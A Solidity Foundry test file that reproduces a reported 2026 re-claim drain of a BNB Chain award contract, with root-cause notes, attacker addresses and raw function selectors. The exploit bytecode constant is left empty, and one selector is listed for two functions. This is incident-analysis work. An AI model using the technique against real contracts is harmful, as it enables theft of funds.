pragma solidity ^0.8.15;

import "../basetest.sol";

// Dream Health Chain (DHC) award re-claim drain -- BNB Chain, 2026-09.
// ~$71.8K taken (71,851.016708 USDT realized by the attacker). Reported by SlowMist TI.
//
// Attacker EOA:      0xD3A8D0A9F55cf679fff6F277E49AfC95B49D2B07
// Exploit contract:  0x226923D34A10f3D54B57b9F4b685E82c6Cba968A  (attacker-deployed)
// Award proxy:       0xe2A047aADbac51b0116Af1cE91eBDAe4B4202094  (EIP-1967, impl slot == vuln impl)
// Vulnerable impl:   0x5abb3fe2a02e5d4320862944cd3a0b8f6af28ce1
// DHC token:         0x743F15f4d2481774d970f286f0EbAD9C3Daed6E9  (reflection token)
// DHC/USDT pair:     0x4b92a34aA2BeeC3FcDFFeB5251C1654eE004e5f4  (PancakeSwap)
//
// Root cause -- the award state machine has no re-claim guard and no privileged path:
//   - createAward() records a fixed reward but locks no collateral / reserves no per-award balance.
//   - participateAward() does not require status==1 (unclaimed); calling it resets a claimed award
//     (status 2 -> 1). The reset is triggerable with a 0-1 wei pledge (selector 0xe3db9b54).
//   - claimAward() (selector 0x43609f36) then pays the SAME fixed reward again out of the shared
//     proxy DHC balance, with no elapsed-time check and no claimed flag that sticks.
//   - The attacker loops pledge + participateAward-reset + claimAward on one position and dumps the
//     DHC for USDT on the PancakeSwap DHC/USDT pair.
//
// Permissionless -- confirmed from on-chain state, not just docs:
//   The proxy owner() is 0x007FA7F9B73d03655886C60E99064E8B8795F015, which is NOT the attacker, yet
//   the whole drain executed as an ordinary non-owner call (tx status = 1). participateAward /
//   claimAward / pledge (0xe3db9b54 / 0x43609f36 / 0xe3db9b54) are all public selectors on the impl
//   dispatcher; the only Ownable-gated selectors (owner/transferOwnership/renounceOwnership) are
//   never on the drain path. In the exploit tx the identical 48.174636 DHC reward is paid out of the
//   proxy 18 times on one position (plus a second award paying 2.283478 DHC 18 times).
//
// Transaction shape -- the attack is FOUR txs from the attacker EOA, all in block 120055460:
//   nonce 0  CREATE                                deploys the exploit contract 0x226923..968A
//   nonce 1  0x226923..968A  0xc0406226            setup (create award / prime position)
//   nonce 2  0x226923..968A  0x9890220b            setup (initial pledge + participate)
//   nonce 3  0x226923..968A  0x84054d3d  cashout   the 18x reset+claim loop + DHC->USDT dump
//     (nonce-3 hash: 0xb4c89845d95fd721e6931dd223e24e8b78a9de8c3b4428251a36d9213e44c496)
//   At the parent block 120055459 the exploit contract has no code and the attacker nonce is 0, so
//   replaying only nonce 3 is a no-op -- the full four-step sequence has to be replayed in order.
//
// PoC: fork one block before the exploit (120055459) and replay the exact sequence as the attacker
// EOA -- deploy the on-chain creation bytecode (nonce 0), then call the three raw selectors
// (nonces 1-3). Pranking the attacker EOA reproduces the real CREATE address 0x226923..968A.
//
// Asserted metric -- the attacker's realized USDT gain (EXP -> attacker EOA). DHC is a reflection
// token, so its per-account balances are perturbed by transfer-tax redistribution on every hop and
// are not a clean loss figure; the attacker's net USDT delta is the one directly-measurable
// realized-profit number in the trace and it matches the reported ~$71.8K. The DHC drained from the
// proxy reserve (~568,370 DHC, 568371.83 -> 1.08) is logged as corroboration.
//
// forge test --contracts src/test/2026-09/DHC_exp.sol -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract DHCExp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xD3A8D0A9F55cf679fff6F277E49AfC95B49D2B07;
    address internal constant AWARD_PROXY = 0xe2A047aADbac51b0116Af1cE91eBDAe4B4202094;
    address internal constant DHC = 0x743F15f4d2481774d970f286f0EbAD9C3Daed6E9;
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    // Realized attacker profit observed on-chain in the exploit tx (USDT has 18 decimals on BSC).
    uint256 internal constant USDT_PROFIT = 71_851_016_708_000_000_000_000; // 71,851.016708 USDT

    // nonce-0 CREATE payload: the exact on-chain creation bytecode of the exploit contract.
    bytes internal constant EXPLOIT_CREATION_CODE = hex"";

    function testExploit() public {
        // One block before the exploit tx (block 120055460).
        vm.createSelectFork("bsc", 120_055_459);
        emit log_named_decimal_uint("Award proxy DHC reserve before", IERC20(DHC).balanceOf(AWARD_PROXY), 18);
        emit log_named_decimal_uint("Attacker USDT before", USDT.balanceOf(ATTACKER), 18);
        uint256 usdtBefore = USDT.balanceOf(ATTACKER);

        // Replay the full four-tx sequence as the attacker EOA (msg.sender and tx.origin = ATTACKER).
        // Deploying under the attacker's prank reproduces the real exploit-contract address.
        vm.startPrank(ATTACKER, ATTACKER);

        bytes memory code = EXPLOIT_CREATION_CODE;
        address exploit;
        assembly {
            exploit := create(0, add(code, 0x20), mload(code))
        }
        require(exploit == 0x226923D34A10f3D54B57b9F4b685E82c6Cba968A, "unexpected exploit address");

        (bool s1, ) = exploit.call(hex"c0406226"); // setup: create award / prime
        require(s1, "setup step 1 failed");
        (bool s2, ) = exploit.call(hex"9890220b"); // setup: initial pledge + participate
        require(s2, "setup step 2 failed");
        (bool s3, ) = exploit.call(hex"84054d3d"); // cashout: 18x reset+claim loop + DHC->USDT dump
        require(s3, "cashout failed");

        vm.stopPrank();

        uint256 gain = USDT.balanceOf(ATTACKER) - usdtBefore;
        emit log_named_decimal_uint("Award proxy DHC reserve after", IERC20(DHC).balanceOf(AWARD_PROXY), 18);
        emit log_named_decimal_uint("Attacker USDT after", USDT.balanceOf(ATTACKER), 18);
        emit log_named_decimal_uint("Attacker USDT profit", gain, 18);

        // Reproduced loss must match the reported ~$71.8K (1 USDT tolerance for reflection-tax noise).
        assertApproxEqAbs(gain, USDT_PROFIT, 1e18, "profit != on-chain incident");
    }
}
